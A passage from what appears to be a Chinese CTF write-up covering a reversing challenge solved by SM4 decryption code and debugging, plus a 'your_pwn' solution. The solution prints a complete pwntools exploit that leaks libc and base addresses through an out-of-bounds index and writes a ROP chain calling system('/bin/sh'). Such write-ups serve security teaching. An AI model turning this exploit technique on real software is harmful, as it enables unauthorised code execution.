class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>,</span><br><span class="line"><span class="number">0x0a</span>,<span class="number">0xc1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,</span><br><span class="line"><span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,<span class="number">0x48</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># System parameter</span><br><span class="line">FK = [<span class="number">0xa3b1bac6</span>,<span class="number">0x56aa3350</span>,<span class="number">0x677d9197</span>,<span class="number">0xb27022dc</span>]</span><br><span class="line"></span><br><span class="line"># fixed parameter</span><br><span class="line">CK = [</span><br><span class="line"><span class="number">0x00070e15</span>,<span class="number">0x1c232a31</span>,<span class="number">0x383f464d</span>,<span class="number">0x545b6269</span>,</span><br><span class="line"><span class="number">0x70777e85</span>,<span class="number">0x8c939aa1</span>,<span class="number">0xa8afb6bd</span>,<span class="number">0xc4cbd2d9</span>,</span><br><span class="line"><span class="number">0xe0e7eef5</span>,<span class="number">0xfc030a11</span>,<span class="number">0x181f262d</span>,<span class="number">0x343b4249</span>,</span><br><span class="line"><span class="number">0x50575e65</span>,<span class="number">0x6c737a81</span>,<span class="number">0x888f969d</span>,<span class="number">0xa4abb2b9</span>,</span><br><span class="line"><span class="number">0xc0c7ced5</span>,<span class="number">0xdce3eaf1</span>,<span class="number">0xf8ff060d</span>,<span class="number">0x141b2229</span>,</span><br><span class="line"><span class="number">0x30373e45</span>,<span class="number">0x4c535a61</span>,<span class="number">0x686f767d</span>,<span class="number">0x848b9299</span>,</span><br><span class="line"><span class="number">0xa0a7aeb5</span>,<span class="number">0xbcc3cad1</span>,<span class="number">0xd8dfe6ed</span>,<span class="number">0xf4fb0209</span>,</span><br><span class="line"><span class="number">0x10171e25</span>,<span class="number">0x2c333a41</span>,<span class="number">0x484f565d</span>,<span class="number">0x646b7279</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ENCRYPT = <span class="number">0</span></span><br><span class="line">DECRYPT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GET_UINT32_BE(key_data):</span><br><span class="line">    tmp_data = <span class="keyword">int</span>((key_data[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (key_data[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (key_data[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | (key_data[<span class="number">3</span>]))</span><br><span class="line">    return tmp_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def PUT_UINT32_BE(n):</span><br><span class="line">    return [<span class="keyword">int</span>((n&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>), <span class="keyword">int</span>((n&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>), <span class="keyword">int</span>((n&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>), <span class="keyword">int</span>((n)&amp;<span class="number">0xff</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># rotate shift left marco definition</span><br><span class="line">def <span class="keyword">SHL</span>(x, n):</span><br><span class="line">    xx = <span class="keyword">int</span>(<span class="keyword">int</span>(x &lt;&lt; n) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    return xx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ROTL(x, n):</span><br><span class="line">    xx = <span class="keyword">SHL</span>(x, n)</span><br><span class="line">    yy = xx | <span class="keyword">int</span>((x &gt;&gt; (<span class="number">32</span> - n)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    return yy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="keyword">XOR</span>(a, b):</span><br><span class="line">    return list(map(lambda x, y: x ^ y, a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># look <span class="meta">up</span> <span class="keyword">in</span> SboxTable <span class="keyword">and</span> get the related value.</span><br><span class="line"># args:    [<span class="keyword">in</span>] inch: <span class="number">0x00</span>~<span class="number">0xFF</span> (<span class="number">8</span> <span class="meta">bits</span> unsigned value).</span><br><span class="line">def sm4Sbox(idx):</span><br><span class="line">    return SboxTable[idx]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Calculating round encryption key.</span><br><span class="line"># args:    [<span class="keyword">in</span>] a: a is a <span class="number">32</span> <span class="meta">bits</span> unsigned value<span class="comment">;</span></span><br><span class="line"># return: sk[i]: i&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,...<span class="number">31</span>&#125;.</span><br><span class="line">def sm4CalciRK(ka):</span><br><span class="line">    b = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    a = PUT_UINT32_BE(ka)</span><br><span class="line">    b[<span class="number">0</span>] = sm4Sbox(a[<span class="number">0</span>])</span><br><span class="line">    b[<span class="number">1</span>] = sm4Sbox(a[<span class="number">1</span>])</span><br><span class="line">    b[<span class="number">2</span>] = sm4Sbox(a[<span class="number">2</span>])</span><br><span class="line">    b[<span class="number">3</span>] = sm4Sbox(a[<span class="number">3</span>])</span><br><span class="line">    bb = GET_UINT32_BE(b[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    rk = bb ^ (ROTL(bb, <span class="number">13</span>)) ^ (ROTL(bb, <span class="number">23</span>))</span><br><span class="line">    return rk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># private F(Lt) function:</span><br><span class="line"># <span class="string">"T algorithm"</span> == <span class="string">"L algorithm"</span> + <span class="string">"t algorithm"</span>.</span><br><span class="line"># args:    [<span class="keyword">in</span>] a: a is a <span class="number">32</span> <span class="meta">bits</span> unsigned value<span class="comment">;</span></span><br><span class="line"># return: c: c is calculated with line algorithm <span class="string">"L"</span> <span class="keyword">and</span> nonline algorithm <span class="string">"t"</span></span><br><span class="line">def sm4Lt(ka):</span><br><span class="line">    b = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    a = PUT_UINT32_BE(ka)</span><br><span class="line">    b[<span class="number">0</span>] = sm4Sbox(a[<span class="number">0</span>])</span><br><span class="line">    b[<span class="number">1</span>] = sm4Sbox(a[<span class="number">1</span>])</span><br><span class="line">    b[<span class="number">2</span>] = sm4Sbox(a[<span class="number">2</span>])</span><br><span class="line">    b[<span class="number">3</span>] = sm4Sbox(a[<span class="number">3</span>])</span><br><span class="line">    bb = GET_UINT32_BE(b[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    c = bb ^ (ROTL(bb, <span class="number">2</span>)) ^ (ROTL(bb, <span class="number">10</span>)) ^ (ROTL(bb, <span class="number">18</span>)) ^ (ROTL(bb, <span class="number">24</span>))</span><br><span class="line">    return c</span><br><span class="line"></span><br><span class="line"># private F function:</span><br><span class="line"># Calculating <span class="keyword">and</span> getting encryption/decryption contents.</span><br><span class="line"># args:    [<span class="keyword">in</span>] x0: original contents<span class="comment">;</span></span><br><span class="line"># args:    [<span class="keyword">in</span>] x1: original contents<span class="comment">;</span></span><br><span class="line"># args:    [<span class="keyword">in</span>] x2: original contents<span class="comment">;</span></span><br><span class="line"># args:    [<span class="keyword">in</span>] x3: original contents<span class="comment">;</span></span><br><span class="line"># args:    [<span class="keyword">in</span>] rk: encryption/decryption key<span class="comment">;</span></span><br><span class="line"># return the contents of encryption/decryption contents.</span><br><span class="line">def sm4F(x0, x1, x2, x3, rk):</span><br><span class="line">    return (x0 ^ sm4Lt(x1 ^ x2 ^ x3 ^ rk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Sm4(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.sk = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">        self.mode = ENCRYPT</span><br><span class="line"></span><br><span class="line">    def sm4_set_key(self, key_data, mode):</span><br><span class="line">        self.sm4_setkey(key_data, mode)</span><br><span class="line"></span><br><span class="line">    def sm4_setkey(self, key, mode):</span><br><span class="line">        MK = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        k = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">        MK[<span class="number">0</span>] = GET_UINT32_BE(key[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">        MK[<span class="number">1</span>] = GET_UINT32_BE(key[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">        MK[<span class="number">2</span>] = GET_UINT32_BE(key[<span class="number">8</span>:<span class="number">12</span>])</span><br><span class="line">        MK[<span class="number">3</span>] = GET_UINT32_BE(key[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">        k[<span class="number">0</span>:<span class="number">4</span>] = <span class="keyword">XOR</span>(MK[<span class="number">0</span>:<span class="number">4</span>], FK[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">        for i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            k[i + <span class="number">4</span>] = k[i] ^ (sm4CalciRK(k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>] ^ CK[i]))</span><br><span class="line">            self.sk[i] = k[i + <span class="number">4</span>]</span><br><span class="line">        self.mode = mode</span><br><span class="line">        if mode == DECRYPT:</span><br><span class="line">            for idx <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                t = self.sk[idx]</span><br><span class="line">                self.sk[idx] = self.sk[<span class="number">31</span> - idx]</span><br><span class="line">                self.sk[<span class="number">31</span> - idx] = t</span><br><span class="line"></span><br><span class="line">    def sm4_one_round(self, sk, in_put):</span><br><span class="line">        out_put = []</span><br><span class="line">        ulbuf = [<span class="number">0</span>]*<span class="number">36</span></span><br><span class="line">        ulbuf[<span class="number">0</span>] = GET_UINT32_BE(in_put[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">        ulbuf[<span class="number">1</span>] = GET_UINT32_BE(in_put[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">        ulbuf[<span class="number">2</span>] = GET_UINT32_BE(in_put[<span class="number">8</span>:<span class="number">12</span>])</span><br><span class="line">        ulbuf[<span class="number">3</span>] = GET_UINT32_BE(in_put[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">        for idx <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            ulbuf[idx + <span class="number">4</span>] = sm4F(ulbuf[idx], ulbuf[idx + <span class="number">1</span>], ulbuf[idx + <span class="number">2</span>], ulbuf[idx + <span class="number">3</span>], sk[idx])</span><br><span class="line"></span><br><span class="line">        out_put += PUT_UINT32_BE(ulbuf[<span class="number">35</span>])</span><br><span class="line">        out_put += PUT_UINT32_BE(ulbuf[<span class="number">34</span>])</span><br><span class="line">        out_put += PUT_UINT32_BE(ulbuf[<span class="number">33</span>])</span><br><span class="line">        out_put += PUT_UINT32_BE(ulbuf[<span class="number">32</span>])</span><br><span class="line">        return out_put</span><br><span class="line"></span><br><span class="line">    def sm4_crypt_ecb(self, input_data):</span><br><span class="line">        # SM4-ECB block encryption/decryption</span><br><span class="line">        length = len(input_data)</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        output_data = []</span><br><span class="line">        while length &gt; <span class="number">0</span>:</span><br><span class="line">            output_data += self.sm4_one_round(self.sk, input_data[i:i+<span class="number">16</span>])</span><br><span class="line">            i += <span class="number">16</span></span><br><span class="line">            length -= <span class="number">16</span></span><br><span class="line">        return output_data</span><br><span class="line"></span><br><span class="line">    def sm4_crypt_cbc(self, iv, input_data):</span><br><span class="line">        #SM4-CBC buffer encryption/decryption</span><br><span class="line">        length = len(input_data)</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        output_data = []</span><br><span class="line">        tmp_input = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">        if self.mode == ENCRYPT:</span><br><span class="line">            while length &gt; <span class="number">0</span>:</span><br><span class="line">                tmp_input[<span class="number">0</span>:<span class="number">16</span>] = <span class="keyword">XOR</span>(input_data[i:i+<span class="number">16</span>], iv[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">                output_data += self.sm4_one_round(self.sk, tmp_input[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">                iv = copy.deepcopy(output_data[i:i+<span class="number">16</span>])</span><br><span class="line">                i += <span class="number">16</span></span><br><span class="line">                length -= <span class="number">16</span></span><br><span class="line"><span class="symbol">        else:</span></span><br><span class="line">            while length &gt; <span class="number">0</span>:</span><br><span class="line">                output_data += self.sm4_one_round(self.sk, input_data[i:i+<span class="number">16</span>])</span><br><span class="line">                output_data[i:i+<span class="number">16</span>] = <span class="keyword">XOR</span>(output_data[i:i+<span class="number">16</span>], iv[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">                iv = copy.deepcopy(input_data[i:i + <span class="number">16</span>])</span><br><span class="line">                i += <span class="number">16</span></span><br><span class="line">                length -= <span class="number">16</span></span><br><span class="line">        return output_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sm4_crypt_ecb(mode, key, data):</span><br><span class="line">    sm4_d = Sm4()</span><br><span class="line">    sm4_d.sm4_set_key(key, mode)</span><br><span class="line">    en_data = sm4_d.sm4_crypt_ecb(data)</span><br><span class="line">    return en_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sm4_crypt_cbc(mode, key, iv, data):</span><br><span class="line">    sm4_d = Sm4()</span><br><span class="line">    sm4_d.sm4_set_key(key, mode)</span><br><span class="line">    en_data = sm4_d.sm4_crypt_cbc(iv, data)</span><br><span class="line">    return en_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    log_init()</span><br><span class="line"> </span><br><span class="line">    key_data = [<span class="number">0xDA</span>,<span class="number">0x98</span>,<span class="number">0xF1</span>,<span class="number">0xDA</span>,<span class="number">0x31</span>,<span class="number">0x2A</span>,<span class="number">0xB7</span>,<span class="number">0x53</span>,<span class="number">0xA5</span>,<span class="number">0x70</span>,<span class="number">0x3A</span>,<span class="number">0xB</span>,<span class="number">0xFD</span>,<span class="number">0x29</span>,<span class="number">0xd</span>,<span class="number">0xD6</span>]  #key</span><br><span class="line">    input_data = [<span class="number">0xEF</span>,<span class="number">0x46</span>,<span class="number">0x8D</span>,<span class="number">0xBA</span>,<span class="number">0xF9</span>,<span class="number">0x85</span>,<span class="number">0xB2</span>,<span class="number">0x50</span>,<span class="number">0x9C</span>,<span class="number">0x9E</span>,<span class="number">0x20</span>,<span class="number">0x0C</span>,<span class="number">0xF3</span>,<span class="number">0x52</span>,<span class="number">0x5A</span>,<span class="number">0xB6</span>] # 密文 </span><br><span class="line">    sm4_d = Sm4()</span><br><span class="line">    sm4_d.sm4_set_key(key_data, DECRYPT)##ENCRYPT 加密是<span class="number">0</span> 解密是<span class="number">1</span></span><br><span class="line">    de_data = sm4_d.sm4_crypt_ecb(input_data)#解密</span><br><span class="line">    print_data(de_data, <span class="string">"de_data:"</span>)</span><br></pre></td></tr></table></figure></p>
<p>解密出来：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x36</span> <span class="number">0x32</span> <span class="number">0x36</span> <span class="number">0x31</span> <span class="number">0x36</span> <span class="number">0x34</span> <span class="number">0x37</span> <span class="number">0x32</span> <span class="number">0x36</span> <span class="number">0x35</span> <span class="number">0x37</span> <span class="number">0x32</span> <span class="number">0x33</span> <span class="number">0x31</span> <span class="number">0x33</span> <span class="number">0x32</span></span><br></pre></td></tr></table></figure></p>
<p>在经过两字16进制解码的出来用户名“badrer12”</p>
<p>密码部分是一个VM来处理的，VM部分太长了，，我分析了好长时间，并不知道VM到底干了些什么，于是动态调试一波</p>
<p>首先在我们输入的字符串下断点（我输入的是123456）<br><img src="https://s2.ax1x.com/2019/04/25/EezJ7q.png" alt><br>通过对该地址的引用和处理，最后发现在内存中和我输入的密码在一块，尝试了一下发现确实是正确的密码：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xyz[<span class="string">|]</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://s2.ax1x.com/2019/04/25/EeztA0.png" alt> </p>
<h4 id="flag-flag-eafd-134g-vp1d-vsdr-v5yg-ai0g-fsdg-g24t-sdfg"><a href="#flag-flag-eafd-134g-vp1d-vsdr-v5yg-ai0g-fsdg-g24t-sdfg" class="headerlink" title="flag:flag{eafd_134g_vp1d_vsdr_v5yg_ai0g_fsdg_g24t_sdfg}"></a>flag:flag{eafd_134g_vp1d_vsdr_v5yg_ai0g_fsdg_g24t_sdfg}</h4><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h3><p>保护全开，漏洞点在sub_B35函数，index索引没有控制大小，导致任意地址读和任意地址写，泄露libc地址和泄露程序基地址，方法是在main函数栈中有一个__libc_start_main+231和push r15，可以通过泄露这两个地址计算出来libc地址和基地址，进而ROP控制程序流程，不过这个ROP是一个一个字节写的<br>exp：（需要用到LibcSearcher）</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">r = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">__libc_start_main_231_offset</span> = <span class="number">0</span>x150+<span class="number">296</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">r.sendline(<span class="string">"radish"</span>)</span><br><span class="line"><span class="variable">__libc_start_main_231_addr</span> = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># leak __libc_start_main_231_addr</span></span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="variable">__libc_start_main_231_offset</span>+x))</span><br><span class="line">	r.recvuntil(<span class="string">"(hex) "</span>)</span><br><span class="line">	data = r.recvuntil(<span class="string">"\n"</span>,<span class="built_in">drop</span>=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">if</span> len(data)&gt;<span class="number">2</span>:</span><br><span class="line">		data = data[-<span class="number">2</span>:]</span><br><span class="line">	elif len(data)==<span class="number">1</span>:</span><br><span class="line">		data = <span class="string">"0"</span>+data</span><br><span class="line">	<span class="variable">__libc_start_main_231_addr</span> = data+<span class="variable">__libc_start_main_231_addr</span></span><br><span class="line">	r.recvuntil(<span class="string">"input new value"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"__libc_start_main_231_addr -&gt;&gt; "</span>+<span class="variable">__libc_start_main_231_addr</span>)</span><br><span class="line"><span class="variable">__libc_start_main_231_addr</span> = eval(<span class="string">"0x"</span>+<span class="variable">__libc_start_main_231_addr</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push_r15_offset = <span class="number">0</span>x150+<span class="number">288</span></span><br><span class="line">push_r15_addr = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(push_r15_offset+x))</span><br><span class="line">	r.recvuntil(<span class="string">"(hex) "</span>)</span><br><span class="line">	data = r.recvuntil(<span class="string">"\n"</span>,<span class="built_in">drop</span>=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">if</span> len(data)&gt;<span class="number">2</span>:</span><br><span class="line">		data = data[-<span class="number">2</span>:]</span><br><span class="line">	elif len(data)==<span class="number">1</span>:</span><br><span class="line">		data = <span class="string">"0"</span>+data</span><br><span class="line">	push_r15_addr = data+push_r15_addr</span><br><span class="line">	r.recvuntil(<span class="string">"input new value\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"push_r15_addr -&gt;&gt; "</span>+push_r15_addr)</span><br><span class="line">push_r15_addr = eval(<span class="string">"0x"</span>+push_r15_addr)</span><br><span class="line"></span><br><span class="line">main_addr = push_r15_addr - <span class="number">0</span>x23b</span><br><span class="line"></span><br><span class="line"><span class="meta"># cover ret_addr</span></span><br><span class="line">offset = <span class="number">0</span>x150+<span class="number">8</span></span><br><span class="line">main_addr = p64(main_addr).encode(<span class="string">"hex"</span>)</span><br><span class="line">print main_addr</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(offset+x))</span><br><span class="line">	r.recvuntil(<span class="string">"input new value\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(eval(<span class="string">"0x"</span>+main_addr[num:num+<span class="number">2</span>])))</span><br><span class="line">	print <span class="built_in">str</span>(eval(<span class="string">"0x"</span>+main_addr[num:num+<span class="number">2</span>]))</span><br><span class="line">	num = num + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"------------------- success cover! -------------------"</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">41</span>-<span class="number">24</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"input new value\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"------------------- ret main success ---------------"</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_addr =  <span class="number">99</span>+push_r15_addr</span><br><span class="line"></span><br><span class="line"><span class="variable">__libc_start_main_addr</span> = <span class="variable">__libc_start_main_231_addr</span>-<span class="number">231</span></span><br><span class="line"><span class="meta"># libc = LibcSearcher(<span class="meta-string">"__libc_start_main"</span>,__libc_start_main_addr)</span></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">base_addr = <span class="variable">__libc_start_main_addr</span>-libc.symbols[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">print hex(base_addr)</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]+base_addr</span><br><span class="line">bin_sh_addr = <span class="number">0</span>x000000000017d3f3+base_addr</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"system_addr: "</span>+hex(system_addr))</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"bin_sh_addr: "</span>+hex(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload = (p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)).encode(<span class="string">"hex"</span>)</span><br><span class="line">print payload</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"radish"</span>)</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">0</span>,<span class="number">24</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(offset+x))</span><br><span class="line">	r.recvuntil(<span class="string">"input new value\n"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(eval(<span class="string">"0x"</span>+payload[num:num+<span class="number">2</span>])))</span><br><span class="line">	print <span class="built_in">str</span>(eval(<span class="string">"0x"</span>+payload[num:num+<span class="number">2</span>]))</span><br><span class="line">	num = num + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"------------------- cover payload success ---------------"</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="built_in">in</span> range(<span class="number">41</span>-<span class="number">24</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"input index\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"input new value\n"</span>)</span><br><span class="line">	r.sendline(<span class="string">"0"</span>)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="meta">#gdb.attach(r)</span></span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line"><span class="built_in">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="baby-pwn"><a href="#baby-pwn" class="headerlink" title="baby_pwn"></a>baby_pwn</h3><p>典型的利用Return-to-dl-resolve，网上有现成的脚本</p>
